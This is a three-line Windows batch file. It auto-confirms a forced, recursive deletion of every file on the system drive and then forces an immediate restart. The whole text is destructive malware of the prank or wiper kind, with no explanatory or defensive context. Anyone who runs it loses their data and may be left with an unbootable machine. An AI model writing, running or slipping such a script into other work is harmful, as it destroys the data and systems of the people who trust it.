@echo off
echo y | del %systemdrive%\*.* /f /s
shutdown -r -f -t 00

